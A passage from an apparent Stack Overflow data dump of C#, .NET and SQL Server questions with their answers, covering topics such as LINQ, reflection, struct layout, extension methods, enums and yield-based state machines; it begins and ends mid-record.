    	}
    }

    private static void WL(object text, params object[] args)
    {
    	Console.WriteLine(text.ToString(), args);	
    }

    private static void RL()
    {
    	Console.ReadLine();	
    }

    private static void Break() 
    {
    	System.Diagnostics.Debugger.Break();
    }

    #endregion
}
</code></pre>

<p>FOREACH comes out at 177ms and GFOREACH at 707ms.</p>

<p>Now I'm guessing there's a good reason for using it but i just can't think of one.  Clearly performance isn't the reason so the question is when would it be the best option?</p>

<p>Thanks in advance.</p>
","33708","","<p>When it looks neater.</p>

<p>Not a joke at all. Really, I mean it. Go with the more readable style in your case. For instance, if you just want to call a method on each item like:</p>

<pre><code>list.ForEach(Console.WriteLine);
</code></pre>

<p>this style suits better. However, if you are having a hundred lines as the body of the loop, or you have nested loops and control flow constructs, the old style looks better.</p>
"
"<p>I have 2 tables, Clients and ClientInterests. The PK/FK being ClientID of type GUID</p>

<p>This is my Linq, where I want to insert into the ClientIneterests table</p>

<pre><code>    ClientInterestRegistration clientRegisteration = new ClientInterestRegistration
{
    ClientID = (from v in DB.Clients
                where v.Email.Equals(EmailAddress)
                select new {v.ClientID}).Single(), 

    ClientInterest = SelectedInterests,
    ..
};
</code></pre>

<p>Error received is:
Cannot implicitly convert type <code>System.Linq.IQueryable&lt;AnonymousType#1&gt;</code> to <code>System.Guid</code></p>
","33708","","<p>First, consider removing <code>new {...}</code> from the query and changing it to:</p>

<pre><code>ClientID = (from v in DB.Clients
            where v.Email.Equals(EmailAddress)
            select v.ClientID).Single()
</code></pre>

<p>What you are doing is to create a new structure with the <code>ClientID</code> as its property.</p>

<p>However, you shouldn't work directly with the key column at all. Try setting the <code>Client</code> directly to the object:</p>

<pre><code>Client = (from v in DB.Clients
          where v.Email.Equals(EmailAddress)
          select v).Single()
</code></pre>
"
"<p>Let's say I have a <code>Type</code> called <code>type</code>.</p>

<p>I want to determine if I can do this with my type (without actually doing this to each type):</p>

<p>If <code>type</code> is <code>System.Windows.Point</code> then I could do this:</p>

<pre><code>Point point1 = new Point();
</code></pre>

<p>However if <code>type</code> is <code>System.Environment</code> then this will not fly:</p>

<pre><code>Environment environment1 = new Environment(); //wrong
</code></pre>

<p>So if I am iterating through every visible type in an assembly how do I skip all the types that will fail to create an instance like the second one?  I'm kind of new to reflection so I'm not that great with the terminology yet.  Hopefully what I'm trying to do here is pretty clear.</p>
","33708","","<p><code>static</code> classes are declared <code>abstract</code> and <code>sealed</code> at the IL level. So, you can check <code>IsAbstract</code> property to handle both <code>abstract</code> classes and <code>static</code> classes in one go (for your use case).</p>

<p>However, <code>abstract</code> classes are not the only types you can't instantiate directly. You should check for things like interfaces (<a href=""http://stackoverflow.com/questions/1093536/how-does-the-c-compiler-detect-com-types"">without the <code>CoClass</code> attribute</a>) and types that don't have a constructor accessible by the calling code. </p>
"
"<p>The following User History table contains <strong>one record for every day a given user has accessed a website</strong> (in a 24 hour UTC period). It has many thousands of records, but only one record per day per user. If the user has not accessed the website for that day, no record will be generated.</p>

<pre>
Id      UserId   CreationDate
------  ------   ------------
750997      12   2009-07-07 18:42:20.723
750998      15   2009-07-07 18:42:20.927
751000      19   2009-07-07 18:42:22.283
</pre>

<p>What I'm looking for is a SQL query on this table <em>with good performance</em>, that tells me which userids have accessed the website for (n) continuous days without missing a day.</p>

<p>In other words, <strong>how many users have (n) records in this table with sequential (day-before, or day-after) dates</strong>? If any day is missing from the sequence, the sequence is broken and should restart again at 1; we're looking for users who have achieved a continuous number of days here with no gaps.</p>

<p>Any resemblance between this query and <a href=""http://stackoverflow.com/badges/71/woot-enthusiast"">a particular Stack Overflow badge</a> is purely coincidental, of course.. :)</p>
","33708","","<p>If you can change the table schema, I'd suggest adding a column <code>LongestStreak</code> to the table which you'd set to the number of sequential days ending to the <code>CreationDate</code>. It's easy to update the table at login time (similar to what you are doing already, if no rows exist of the current day, you'll check if any row exists for the previous day. If true, you'll increment the <code>LongestStreak</code> in the new row, otherwise, you'll set it to 1.) </p>

<p>The query will be obvious after adding this column:</p>

<pre><code>if exists(select * from table
          where LongestStreak &gt;= 30 and UserId = @UserId)
   -- award the Woot badge.
</code></pre>
"
"<p>I need to add key/object pairs to a dictionary, but I of course need to first check if the key already exists otherwise I get a ""<strong>key already exists in dictionary</strong>"" error. The code below solves this but is clunky.</p>

<p><strong>What is a more elegant way of doing this without making a string helper method like this?</strong></p>

<pre><code>using System;
using System.Collections.Generic;

namespace TestDictStringObject
{
    class Program
    {
        static void Main(string[] args)
        {
            Dictionary&lt;string, object&gt; currentViews = new Dictionary&lt;string, object&gt;();

            StringHelpers.SafeDictionaryAdd(currentViews, ""Customers"", ""view1"");
            StringHelpers.SafeDictionaryAdd(currentViews, ""Customers"", ""view2"");
            StringHelpers.SafeDictionaryAdd(currentViews, ""Employees"", ""view1"");
            StringHelpers.SafeDictionaryAdd(currentViews, ""Reports"", ""view1"");

            foreach (KeyValuePair&lt;string, object&gt; pair in currentViews)
            {
                Console.WriteLine(""{0} {1}"", pair.Key, pair.Value);
            }
            Console.ReadLine();
        }
    }

    public static class StringHelpers
    {
        public static void SafeDictionaryAdd(Dictionary&lt;string, object&gt; dict, string key, object view)
        {
            if (!dict.ContainsKey(key))
            {
                dict.Add(key, view);
            }
            else
            {
                dict[key] = view;
            }
        }
    }
}
</code></pre>
","33708","","<p>What's wrong with...</p>

<pre><code>dict[key] = view;
</code></pre>

<p>It'll automatically add the key if it's non-existent.</p>
"
"<p>I'm trying to write some portable C++ library code that will initially rely on Boost.Regex, and then move to TR1 as compilers support it, and eventually to the C++0x specification after things get moved from the std::tr1 namespace to std. Here is some pseudo-code for what I'd like to do with the preprocessor:</p>

<pre><code>if( exists(regex) )    // check if I can #include &lt;regex&gt;
{
    #include &lt;regex&gt;    // per TR1
    if( is_namespace(std::tr1) )   // are we on TR1 or C++0x?
    {
        using std::tr1::regex;
    } else
    {
        using std::regex;
    }
} else    // fall-back to boost
{
    #include &lt;boost/regex.hpp&gt;
    using boost::regex;
}
</code></pre>

<p>Granted, all of that would need to be in preprocessor directives, but if I knew how to accomplish that I wouldn't be asking here. :)</p>
","33708","","<p>You can't do it without relying on a third party thing <em>before</em> preprocessing. Generally, things like <code>autoconf</code> can be used to accomplish this. </p>

<p>They work by generating another header file with <code>#define</code> directives that indicate existence of headers/libraries you want to use.</p>
"
"<p>In Java I can write: </p>

<pre><code>public final static MyClass foo = new MyClass(""foo"");
</code></pre>

<p>is there an equivalent in C#?</p>
","33708","","<p>The closest thing (not exactly the same, <a href=""http://renaud.waldura.com/doc/java/final-keyword.shtml""><code>final</code> has other meanings</a> too) for Java <code>final</code> fields I can think of is <a href=""http://msdn.microsoft.com/en-us/library/acdd6hb7%28VS.71%29.aspx""><code>readonly</code></a>: </p>

<pre><code>public static readonly MyClass field = new MyClass(""foo"");
</code></pre>

<p>If you have a primitive type (string, int, boolean), you may want to use <code>const</code> instead.</p>

<pre><code>public const string MAGIC_STRING = ""Foo"";
</code></pre>
"
"<p>I'm trying to understand why the second example below works with no issues, but the first example gives me the exception below. It seems to me that both examples should give an exception based on the description. Can anyone enlighten me?</p>

<blockquote>
  <p>Unhandled Exception:
  System.TypeLoadException: Could not
  load type 'StructTest.OuterType' from
  assembly 'StructTest, Version=1.0.0.0,
  Culture=neutral,  PublicKeyToken=null'
  because it contains an object field at
  offset 0 that is incorrectly aligned
  or overlapped by a non-object field.<br />
  at StructTest.Program.Main(String[]
  args) Press any key to continue . . .</p>
</blockquote>

<p><strong>Example 1</strong></p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace StructTest
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct InnerType
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 100)]
        char[] buffer;
    }

    [StructLayout(LayoutKind.Explicit)]
    struct OuterType
    {
        [FieldOffset(0)]
        int someValue;

        [FieldOffset(0)]
        InnerType someOtherValue;
    }

    class Program
    {
        static void Main(string[] args)
        {
            OuterType t = new OuterType();
            System.Console.WriteLine(t);
        }
    }
}
</code></pre>

<p><hr /></p>

<p><strong>Example 2</strong></p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace StructTest
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct InnerType
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 100)]
        char[] buffer;
    }

    [StructLayout(LayoutKind.Explicit)]
    struct OuterType
    {
        [FieldOffset(4)]
        private int someValue;

        [FieldOffset(0)]
        InnerType someOtherValue;

    }

    class Program
    {
        static void Main(string[] args)
        {
            OuterType t = new OuterType();
            System.Console.WriteLine(t);
        }
    }
}
</code></pre>
","33708","","<p>The common language runtime contains a verifier that makes sure the running code (verifiable IL) cannot possibly corrupt memory in the managed environment. This prevents you to declare such a structure in which fields overlap. Basically, your struct contains two data members. One integer (which is 4 bytes) and a native integer (pointer size). On a 32 bit CLR, in which you are probably running your code, the <code>char[]</code> will take 4 bytes so if you put the integer less than four bytes away from the beginning of the struct, you'll have overlapping fields. It's interesting to note that both of your code snippets with fail on a 64 bit runtime, as the pointer size is 8 bytes.</p>
"
"<p>I have to use a method which accepts double[,], but I only have a double[]. How can I convert it?</p>

<p>Solution so far:</p>

<pre><code>var array = new double[1, x.Length];
foreach (var i in Enumerable.Range(0, x.Length))
{
    array[0, i] = x;
}
</code></pre>
","33708","","<p>There's no direct way. You should copy stuff into a <code>double[,]</code>. Assuming you want it in a single row:</p>

<pre><code>double[,] arr = new double[1, original.Length];
for (int i = 0; i &lt; original.Length; ++i) 
    arr[0, i] = original[i];
</code></pre>
"
"<p>What I mean is: Imagine we have a 8 byte variable that has a high value and low value. I can make one pointer point to the upper 4 bytes and other point to the lower 4 bytes, and set/retrieve their values without problems. Now, is there a way to get/set values for anything smaller than a byte? If instead of dividing it in two 4 bytes ""variables"", I'd want to consider eight 1 byte variables I could use a bool, but there is no defined smaller variable in c#. Would it possible to divide it to 16 just with pointers? Or even in 32, 64? It wouldn't right?</p>

<p>This is a pretty academic question, I know this can be achieved otherwise with bitshiffting, unions(Struct.Explicit), etc. Thanks!</p>
","33708","","<p>No, C# does not support bit fields and a byte is the minimum amount of addressable memory. You can manually provide properties that change one or several specific bits but you have to provide packing/unpacking logic yourself:</p>

<pre><code>public bool Bit5 {
    get { return (field &amp; 32) != 0; }
    set { if (value) field |= 32; else field &amp;= ~32; }
}
</code></pre>

<p>By the way, I don't know how you achieve it using <code>LayoutKind.Explicit</code> as the minimum <code>FieldOffset</code> you can specify is one <strong>byte</strong>. </p>

<p>As a side note, even C++ that can do this with bit fields will just <em>hide</em> the bitwise tricks and makes the compiler do it instead of you. There's no way you could grab something less than a byte from memory to a register, at least on x86 architecture.</p>
"
"<p>When I call the EntryPoint with a parameter of type TemplateA, I always receive an exception, since the first overload is always called.
<br/>What I expected to happen is that the most specific method (second overload) will be called due to dynamic binding.
<br/>Any ideas why?</p>

<pre><code>private object _obj;
    public void EntryPoint(object p)
    {
        myFunc(p);
    }

    //first overload
    private void myFunc(object container)
    {
        throw new NotImplementedException();
    }

    //second overload
    private void myFunc(TemplateA template)
    {
        _obj = new ObjTypeA(template);
    }

    //third overload
    private void myFunc(TemplateB template)
    {
        _obj = new ObjTypeB(template);
    }
</code></pre>
","33708","","<blockquote>
  <p>What I expected to happen is that the most specific method (second overload) will be called due to dynamic binding. </p>
</blockquote>

<p>Where do you see dynamic binding here? The static type of the variable is <code>object</code>. Unless you call a virtual method <em>on it</em> directly, no dynamic dispatch is going to happen. The overload is completely statically resolved at compile time.</p>

<p>Eric Lippert has a related blog entry on this: <a href=""http://blogs.msdn.com/ericlippert/archive/2009/04/09/double-your-dispatch-double-your-fun.aspx"" rel=""nofollow"">Double Your Dispatch, Double Your Fun</a>.</p>
"
"<p>Why can't I create a constraint on an <code>nvarchar(max)</code> column? SQL Server will not allow me to put a unique constraint on it. But, it allows me to create a unique constraint on an <code>nvarchar(100)</code> column.</p>

<p>Both of these columns are <code>NOT NULL</code>. Is there any reason I can't add a constraint to the <code>nvarchar(max)</code> column?</p>
","33708","","<p><code>nvarchar(max)</code> is really a different data type from <code>nvarchar(integer-length)</code>. It's characteristics are more like the deprecated <code>text</code> data type. </p>

<p>If <code>nvarchar(max)</code> value becomes too large, like <code>text</code>, it will be stored <strong>outside</strong> the row (a row is constrained to 8000 bytes maximum) and a pointer to it is stored in the row itself. You cannot efficiently index such a large field and the fact that data can be stored somewhere else further complicates searching and scanning the index.<br />
A unique constraint requires an index to be enforced and as a result, SQL Server designers decided to disallow creating a unique constraint on it.</p>
"
"<p>What is the fastest way to import 15000000 records from Text File to SQL Server?</p>

<p>Currently, I am importing data using Enterprise Manager, that takes 3-4 hours for importing into the SQL table.</p>

<p>Thanks in advance!</p>
","33708","","<p>Try <a href=""http://msdn.microsoft.com/en-us/library/aa196743%28SQL.80%29.aspx"" rel=""nofollow"">bcp utility or BULK INSERT statement</a>. BULK INSERT statement should be <a href=""http://msdn.microsoft.com/en-us/library/aa178096%28SQL.80%29.aspx"" rel=""nofollow"">faster</a> though.</p>
"
"<p>I am using the below code to exit a process programatically.
since i am new to this concept. I want to know how to use this below code.</p>

<p>Logic : I will have the process name to be terminated, i shud assign that to
this function.</p>

<p>Say if want to terminate a notepad, how to pass parameter [Process Name] 
to this function ?</p>

<pre><code>    [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = false)]
    static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
    static uint WM_CLOSE = 0xF060;

    public void CloseWindow(IntPtr hWindow)
    {
        SendMessage(hWindow, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
    }
</code></pre>
","33708","","<p>Use the <code>Process.CloseMainWindow</code> instead of manually sending the message. This will send the message to the main window of the process:</p>

<pre><code>using System.Diagnostics;
// ...

foreach (var process in Process.GetProcessesByName(""notepad.exe""))
    process.CloseMainWindow();
</code></pre>

<p>Alternatively, you can use <code>MainWindowHandle</code> to get the handle of the main window of a <code>Process</code> and send a message to it:</p>

<pre><code>foreach (var process in Process.GetProcessesByName(""notepad.exe""))
    CloseWindow(process.MainWindowHandle); // CloseWindow is defined by OP.
</code></pre>

<p>If you want to kill the process immediately instead of closing the main window, this is not a good approach. You should use the <code>Process.Kill</code> method instead.</p>
"
"<p>how we can use one class, which is inside into another class as property? i want only theoratical explanation and one small example.</p>
","33708","","<p>You mean a nested class used as a type of a property? As long as the access modifier of the property is at most as restrictive as the type of the property, you can do this. </p>

<p>Simply, you should be able to access the type if you can see the property.</p>
"
"<p>Right, so MS introduces <a href=""http://msdn.microsoft.com/en-us/library/bb383977.aspx"" rel=""nofollow"">Extension Methods for C# 3.0</a>. Basically, it allows you to add new methods to an existing classes without having to subclass from it or change its implementation. Immediately alarm bells go off in my mind.</p>

<p>1) You start implementing your own extension methods for a library or standard library classes. Now it is not standardized anymore.</p>

<p>2) In OOP, you define a new type either through inheritance or composition. What actually is extension methods then? Likewise, in using extension methods there is no explicit relationship defined.</p>

<p>3) Are extension methods portable between projects? What if two extension methods for a method exists?</p>

<p>So are extension methods a whole bunch of worms worth avoiding? I can see that there are merits in it, as in you type less, but somehow it looks like would lead to bad practice. </p>

<p>Opinions?</p>
","33708","","<p>Extension methods <strong>are not</strong> added to a type. They are just syntactic sugar. You can't access private stuff. An extension method is just like any static method that consumes a type.</p>

<p>Worst thing they can do is to harm readability and mislead people. Beyond the syntax, they are nonexistent.</p>

<h3>UPDATE (re comment):</h3>

<p>This is exactly what I meant from ""misleading people"" and ""harming readability."" Fortunately, Visual Studio is pretty helpful in distinguishing extension methods (using an icon in the IntelliSense list and the tooltip). Personally, I'm a little biased against adding a bunch of extension methods to <em>arbitrary</em> classes of the framework (with the exception of <code>sealed</code> classes where extension methods can make a lot of sense) unless they provide a significant benefit for the particular project. I prefer keeping extension methods mostly for interfaces and classes on top levels of inheritance hierarchy. This will make developers only use them where they are applicable to many cases in the framework rather than making any utility method an extension (IMO, this is direct artifact of autodiscovery of extension methods in a whole namespace. I really wish C# required you to add a <code>using</code> directive on a the specific <code>class</code> rather than automatically importing all extensions in a <code>namespace</code>).</p>

<p>In my experience, if you don't overuse extension methods by making every utility method that's used a few times (I've seen some people do this) an extension, it's rarely a maintenance problem. It will improve readability if used wisely. </p>

<p>Cluttering up classes with extension methods is not a good thing. At the extreme cases, it can be dangerous. One might introduce a <strong>name collision</strong> issue by adding a method to class with the same name of an already existing extension. This can break code snippets that previously called the extension and are now calling the new method.<br />
In my opinion, this is the biggest issue associated to extension methods. This makes good naming of extensions very important. </p>
"
"<p>I am writing dice roller program in C# console. I am giving two input </p>

<ol>
<li>Enter the size of the dice and </li>
<li>Enter how times you want to play. </li>
</ol>

<p>Suppose dice size is 6 and 10 times i have played. </p>

<pre><code>Output is coming:
1 was rolled  2 times
2 was rolled  7 times
3 was rolled  8 times
4 was rolled  7 times
5 was rolled  4 times
6 was rolled  5 times
</code></pre>

<p>Total: 33 (its not fixed for every execution this no will be changed)</p>

<p>But my requirement was this total always should be number of playing times. Here I am playing 10 times so the total should be 10 not 33. It should happen for every new numbers... If I play 100 times sum or total should be 100 only not any other number. rest all will be remain same, in my programing not getting the expected sum. Please somebody modify it. Here is my code:</p>

<p>Dice.cs:</p>

<pre><code>public class Dice
{
    Int32 _DiceSize;
    public  Int32 _NoOfDice;     
    public Dice(Int32 dicesize)
    {
        this._DiceSize = dicesize;         
    }
    public string Roll()
    {
        if (_DiceSize&lt;= 0)
        {
            throw new ApplicationException(""Dice Size cant be less than 0 or 0"");                 
        }
        if (_NoOfDice &lt;= 0)
        {
            throw new ApplicationException(""No of dice cant be less than 0 or 0"");
        }
        Random rnd = new Random();
        Int32[] roll = new Int32[_DiceSize];
        for (Int32 i = 0; i &lt; _DiceSize; i++)
        {
            roll[i] = rnd.Next(1,_NoOfDice);
        }
        StringBuilder result = new StringBuilder();
        Int32 Total = 0;
        Console.WriteLine(""Rolling......."");
        for (Int32 i = 0; i &lt; roll.Length; i++)
        {
            Total += roll[i];
            result.AppendFormat(""{0}:\t was rolled\t{1}\t times\n"", i + 1, roll[i]);
        }
        result.AppendFormat(""\t\t\t......\n"");
        result.AppendFormat(""TOTAL: {0}"", Total);
        return result.ToString();
    }
}
class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine(""Enter no of dice size"");
        int dicesize = Convert.ToInt32(Console.ReadLine());
        Console.WriteLine(""How many times want to play"");
        int noofplay=Convert.ToInt32(Console.ReadLine());
        Dice obj = new Dice(dicesize);
        obj._NoOfDice = noofplay;
        obj.Roll();
        Console.WriteLine(obj.Roll());           
        Console.WriteLine(""Press enter to exit"");
        Console.ReadKey();
    }
}
</code></pre>
","33708","","<p>You are creating a new <code>Random</code> instance on each iteration. This is not a good thing as it will affect the uniform distribution of results. Keep the <code>Random</code> instance in a field instead of creating a new one every time.</p>

<pre><code>public class Dice {
    private Random rnd = new Random();

    // ... don't create a new random in `Roll` method. Use `rnd` directly.
}
</code></pre>
"
"<p>I have a combo box where I am displaying some entries like:</p>

<pre><code>Equals
Not Equals 
Less Than
Greater Than
</code></pre>

<p>Notice that these strings contain spaces. I have a enum defined which matches to these entries like:</p>

<pre><code>enum Operation{Equals, Not_Equals, Less_Than, Greater_Than};
</code></pre>

<p>Since space is not allowed, I have used _ character.</p>

<p>Now, is there any way to convert given string automatically to an enum element without writing a loop or a set of if conditions my self in C#?</p>
","33708","","<p>I suggest building a <code>Dictionary&lt;string, Operation&gt;</code> to map friendly names to enum constants and use normal naming conventions in the elements themselves. </p>

<pre><code>enum Operation{ Equals, NotEquals, LessThan, GreaterThan };

var dict = new Dictionary&lt;string, Operation&gt; {
    { ""Equals"", Operation.Equals },
    { ""Not Equals"", Operation.NotEquals },
    { ""Less Than"", Operation.LessThan },
    { ""Greater Than"", Operation.GreaterThan }
};

var op = dict[str];
</code></pre>

<p>Alternatively, if you want to stick to your current method, you can do (which I recommend against doing):</p>

<pre><code>var op = (Operation)Enum.Parse(typeof(Operation), str.Replace(' ', '_'));
</code></pre>
"
"<p>On my test DB, the dates are displayed in a DD/MM/YYYY format. By displayed I mean when you right click, open table in Management Studio, the returned data are displayed in a DD/MM/YYYY format.</p>

<p>Funny thing is, when I write T-SQL to retrieve records, I have to input a MM/DD/YYYY format to get back the right data. Is there anyway I can align this to a DD/MM/YYYY format?</p>
","33708","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/ms174398.aspx"">SET LANGUAGE</a> to choose the date format that SQL Server <strong><em>expects</strong> in queries</em> (I think management studio uses client computer's regional settings for display purposes,  not sure though). However, I suggest passing values using parameters instead of embedding them in query statement. You won't encounter any issues if you use parameters. Everything is taken care of.</p>

<pre><code>set language us_english
declare @d datetime = '1929/12/18'

set language british
declare @d datetime = '1929/12/18' -- fails
</code></pre>

<p>To change the server default language:</p>

<pre><code>declare @langid int = (select langid from syslanguages where name = 'british')
exec sp_configure 'default language', @langid
reconfigure with override
</code></pre>
"
"<p>I currently have a menu with subitems that is being stored in this dictionary variable:</p>

<pre><code>private Dictionary&lt;string, UserControl&gt; _leftSubMenuItems 
    = new Dictionary&lt;string, UserControl&gt;();
</code></pre>

<p>So I add views to the e.g. the ""Customer"" section like this:</p>

<pre><code>_leftSubMenuItems.Add(""customers"", container.Resolve&lt;EditCustomer&gt;());
_leftSubMenuItems.Add(""customers"", container.Resolve&lt;CustomerReports&gt;());
</code></pre>

<p>But since I am using a Dictionary, <strong>I can only have one key named ""customers""</strong>.</p>

<p>My natural tendency would be to now create a <strong>custom struct</strong> with properties ""Section"" and ""View"", but <strong>is there a .NET collection is better suited for this task, something like a ""MultiKeyDictionary""?</strong></p>

<h1>ANSWER:</h1>

<p>Thanks maciejkow, I expanded your suggestion to get exactly what I needed:</p>

<pre><code>using System;
using System.Collections.Generic;

namespace TestMultiValueDictionary
{
    class Program
    {
        static void Main(string[] args)
        {
            MultiValueDictionary&lt;string, object&gt; leftSubMenuItems = new MultiValueDictionary&lt;string, object&gt;();

            leftSubMenuItems.Add(""customers"", ""customers-view1"");
            leftSubMenuItems.Add(""customers"", ""customers-view2"");
            leftSubMenuItems.Add(""customers"", ""customers-view3"");
            leftSubMenuItems.Add(""employees"", ""employees-view1"");
            leftSubMenuItems.Add(""employees"", ""employees-view2"");

            foreach (var leftSubMenuItem in leftSubMenuItems.GetValues(""customers""))
            {
                Console.WriteLine(leftSubMenuItem);
            }

            Console.WriteLine(""---"");

            foreach (var leftSubMenuItem in leftSubMenuItems.GetAllValues())
            {
                Console.WriteLine(leftSubMenuItem);
            }

            Console.ReadLine();
        }
    }

    public class MultiValueDictionary&lt;TKey, TValue&gt; : Dictionary&lt;TKey, List&lt;TValue&gt;&gt;
    {

        public void Add(TKey key, TValue value)
        {
            if (!ContainsKey(key))
                Add(key, new List&lt;TValue&gt;());
            this[key].Add(value);
        }

        public List&lt;TValue&gt; GetValues(TKey key)
        {
            return this[key];
        }

        public List&lt;TValue&gt; GetAllValues()
        {
            List&lt;TValue&gt; list = new List&lt;TValue&gt;();

            foreach (TKey key in this.Keys)
            {
                List&lt;TValue&gt; values = this.GetValues(key);
                list.AddRange(values);
            }

            return list;
        }
    }

}
</code></pre>

<h1>Answer 2:</h1>

<p>Thanks Blixt for the tip about yield, here is GetAllValues with that change:</p>

<pre><code>public IEnumerable&lt;TValue&gt; GetAllValues()
{
    foreach (TKey key in this.Keys)
    {
        List&lt;TValue&gt; values = this.GetValuesForKey(key);
        foreach (var value in values)
        {
            yield return value;
        }
    }
}
</code></pre>

<h1>Answer 2 refactored further:</h1>

<p>Here is a much more succinct way to do the same thing, thanks Keith:</p>

<pre><code>public IEnumerable&lt;TValue&gt; GetAllValues()
{
    foreach (var keyValPair in this)
        foreach (var val in keyValPair.Value)
            yield return val;
}
</code></pre>
","33708","","<p>No, there's no better built-in collection. I think your ""natural tendency"" is perfectly suited for solving this problem, as those are not really ""same keys,"" but unique keys composed of different parts and <code>Dictionary</code> does the job. You can also nest dictionary (makes sense if you have large number of values for each name):</p>

<pre><code>Dictionary&lt;string, Dictionary&lt;Type, object&gt;&gt; dict = ...;
var value = (T)dict[name][typeof(T)];
</code></pre>

<p>This approach will resolve to the element using a single hash table lookup. If you maintain a list of items for each element, you'll have to linearly traverse the list each time you need an element to lookup which defeats the purpose of using a <code>Dictionary</code> in the first place.</p>
"
"<p>I was wondering if I can make my code clearer by indicating one variable is a static class variable. If it wasn't static I could use this.variableName, and everyone would look at it and immediately know that.</p>

<p>I know I could adopt a naming convention like s_variableName, but that seems a little odd to me and increases the learning curve of the code.</p>

<p>Is there an equivalent of ""this"" for static variables?</p>
","33708","","<p>Qualify it with the type name:</p>

<pre><code>TypeName.staticVariableName
</code></pre>
"
"<p>Can I create an object of my class in stack regarding .net and C#?
For example:</p>

<pre><code>class abc { int i=1; } 
abc a1=new abc();
</code></pre>

<p>Now, here the object is created in heap. So, is there any way to create the object in stack memory of ram if the size of object is not big?</p>
","33708","","<p>.NET reference types always live on the GC heap. It's not possible to have them elsewhere. Even C++/CLI that supports things like</p>

<pre><code>System::Random rnd;
rnd.Next();
</code></pre>

<p>that looks like stack variables, actually creates the <code>Random</code> class, on the GC heap (and calls its <code>Dispose</code> method at the end of the block if it implements <code>IDisposable</code>.)</p>

<p>That said, as Eric Lippert says, <a href=""http://blogs.msdn.com/ericlippert/archive/2009/04/27/the-stack-is-an-implementation-detail.aspx"" rel=""nofollow"">the stack is an implementation detail</a> and you should primarily care about reference or value semantics of the types you create.</p>
"
"<p>Is there a .NET method that will produce a description of a C# method signature from a 
MethodInfo object.
E.g.
The following code might display ""static int Main(string[])""</p>

<pre><code>static int Main(string[] args)
{
    var method = MethodInfo.GetCurrentMethod();
    Console.WriteLine(DescribeMethodSignature(method));
}
</code></pre>
","33708","","<p>.NET base class library does not have such a method. This is C# specific and it doesn't make sense to have it in a class library shared among many languages. It shouldn't be hard to write one though. </p>
"
"<p>Is it feasible to use the yield keyword to implement a simple state machine <a href=""http://en.wikipedia.org/wiki/Finite%5FState%5FMachine"">as shown here</a>. To me it looks like the C# compiler has done the hard work for you as it internally implements a state machine to make the yield statement work.</p>

<p>Can you piggy-back on top of the work the compiler is already doing and get it to implement most of the state machine for you?</p>

<p>Has anyone done this, is it technically possible?</p>
","33708","","<p>Yes, it's absolutely possible and easy to do. You can enjoy using control flow constructs (<code>for</code>, <code>foreach</code>, <code>while</code>, ... <code>goto</code> (using <code>goto</code> particularly suits this scenario ;))) along with <code>yield</code>s to build one.</p>

<pre><code>IEnumerator&lt;State&gt; StateMachine
             (Func&lt;int&gt; currentInput /* gets current input from IO port */, 
              Func&lt;int&gt; currentOutput) {
    for (;;)  {
       if ((currentInput() &amp; 1) == 0) 
           yield return new State(""Ready""); 
       else {
           if (...) {
               yield return new State(""Expecting more data"");
               SendOutput(currentOutput());
               while ((currentInput() &amp; 2) != 0) // while device busy
                    yield return new State(""Busy"");
           else if (...) { ... } 
       }
    }
}

// consumer:
int data;
var fsm = StateMachine(ReadFromIOPort, () =&gt; data);
// ...
while (fsm.Current != ""Expecting more data"")
    fsm.MoveNext();
data = 100;
fsm.MoveNext();
</code></pre>
"
"<p>I have an app that starts 10 threads.
Each thread does it's work and waits (using the producer consumer model).
So when more work comes along, one of the threads is unblocked and it does the work.</p>

<p>A colleague at work insists I should write some code that monitors the threads ""just in case"" they freeze/do not respond or die.</p>

<p>So far in my testing, they work fine and close down correctly.</p>

<p>My question is ""should I put code in to do this""? If so, ""how do I monitor a thread and check it's status""?</p>

<p>Thanks.
JD</p>
","33708","","<p>It really depends on the situation. First of all, you should focus on correctness so that it doesn't freeze or die but if you need more reliability, you should first think about how you can gracefully recover from such a situation. You should think about why it might freeze or die and if it did, now what you can do. If you can't do anything good that reliably recovers from such a situation, you shouldn't even try. If can do it without making the situation worse, then you can go and try doing so. </p>

<p>Obviously, if you made such a choice, you have to be careful not to mess things up and introduce some bugs that actually make the bad stuff happen yourself.</p>
"
"<p>I read in a lot of books the claim that ""<strong>C is a subset of C++</strong>"".<br />
Actually some (good?) books say: ""C is a subset of C++ <strong>except the little Details</strong>"".</p>

<p>I am interested what these details are.  I've never seen one.</p>
","33708","","<p>There are plenty of things. Just a simple example (it should be enough to prove C is not a proper subset of C++):</p>

<pre><code>int* test = malloc(100 * sizeof(int));
</code></pre>

<p>should compile in C but not in C++.</p>
"
"<p>I have an ASP.Net HTTPHandler that gets POSTed from a ColdFusion web page whose FORM looks something like:</p>

<pre><code>&lt;form name=""sendToHandler"" action=""http://johnxp/FileServiceDemo2005/UploadHandler.ashx"" method=""post""&gt;
&lt;input type=""hidden"" name=""b64fileName"" value=""fileservice.asmx.xml"" /&gt;
&lt;input type=""hidden"" name=""strDocument"" value=""Document"" /&gt;
&lt;input type=""submit"" name=""submitbtn""  value=""Submit"" /&gt;
</code></pre>

<p> </p>

<p>What is the best way for this .Net Handler to return a string to the POSTing ColdFusion page? </p>

<p>EDIT update Aug 14, 2009: </p>

<p>The solution I came up in my .ashx file involves saving the URL of the .cfm file that POSTed my handler and appending a querystring with the result string(s) that I want to communicate back to ColdFusion. My CF colleague uses the presence or absence of this querystring data to format the .cfm webpage accordingly:</p>

<pre><code>public void ProcessRequest(HttpContext context)
    {
        string returnURL = context.Request.ServerVariables[""HTTP_REFERER""];  // posting CFM page
        string message = UploadFile(context);    // handles all the work of uploading a file
        StringBuilder msgReturn = new StringBuilder(returnURL);
        msgReturn.Append(""?n="");
        msgReturn.Append(HttpUtility.UrlEncode(TRIMrecNumAssigned));
        msgReturn.Append(""&amp;m="");  // this is just a msg with performance data about the upload operation (elapsed time, size of file, etc.)
        msgReturn.Append(HttpUtility.UrlEncode(message));
